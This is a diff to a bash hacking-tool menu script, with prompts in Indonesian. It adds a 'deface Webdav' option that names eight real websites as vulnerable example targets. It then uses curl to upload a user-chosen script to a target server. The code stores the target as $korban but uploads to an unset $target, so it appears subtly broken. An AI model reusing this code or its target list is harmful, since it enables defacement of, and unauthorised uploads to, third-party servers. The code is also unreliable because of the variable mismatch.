@@ -61,6 +61,7 @@ echo -e $gold"= 18) Google-Dork    = -itsFrogTune7      ="
 echo -e $gold"= 19) Kuyang-Tools.  =-Mr.P3JU4N9 Trs4k1t1="
 echo -e $gold"= 20) wifi-hacker.   =-Ncs net22 t3rs4k1t1="
 echo -e $red"= 21) IP-TRACK       = -Mr.IK3H_ISH       ="
+echo -e $yellow"= 22) deface Webdav=                      ="
 echo -e $gold"= 00) crotz          =                    ="
 echo -e $gold"==========================================="
 echo -e $white""
@@ -358,6 +359,32 @@ cd IP-TRACK
 chmod +x *
 pip install -r requisments.txt
 python iptrack.py
+fi
+
+if [ $act = 22 ] || [ $act = 22 ]
+then
+clear
+echo "\033[34;1m"
+cowsay -f kiss.cow "./Droid" | lolcat
+figlet -f slant MrB4J1N64N
+echo -e $"red"
+echo "Masukan Web target"
+echo "Contoh Web Target vuln"
+echo "	http://bestilling.udir.no/"
+echo "	http://560560.ru/"
+echo "	http://myownemailer.com/"
+echo "	http://Zoocentral.co.za/"
+echo "	http://50-50-50.ru/"
+echo "	http://tirupurjobs.net/"
+echo "	http://Matrimony.co.za/"
+echo "	http://Bheh.co.za/"
+read -p "T.HUNTER=" korban
+echo "Nama script kalian"
+echo "yang ada di Luar Folder Ruang Penyimpanan"
+read -p "T.HUNTER=" script
+curl -T /storage/emulated/0/$script $target
+echo "\033[33;1m"
+echo "Done cek di$target $script "
 fi
 
 if [ $act = 00 ] || [ $act = 00 ]
